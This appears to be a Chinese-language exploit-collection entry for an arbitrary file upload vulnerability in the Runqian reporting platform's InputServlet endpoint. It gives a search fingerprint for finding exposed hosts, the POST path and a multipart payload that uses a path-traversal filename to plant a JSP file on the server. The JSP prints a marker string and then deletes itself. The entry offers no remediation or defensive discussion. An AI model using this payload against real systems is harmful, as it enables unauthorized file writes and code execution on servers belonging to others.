# 润乾报表平台InputServlet任意文件上传漏洞

润乾报表平台InputServlet ｜ 文件上传 ｜ —
- **指纹**：`body="润乾报表"`
- **请求**：`POST /InputServlet?action=12 HTTP/1.1`

**Payload**
```
--878byugbhfverkyfhbh675667
Content-Disposition: form-data; name="upsize"
1024
--878byugbhfverkyfhbh675667
Content-Disposition: form-data; name="file"; filename="/\..\\..\\..\dudesuite.jsp"
Content-Type: image/jpeg
<% out.println("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--878byugbhfverkyfhbh675667--
```
- **响应特征**：200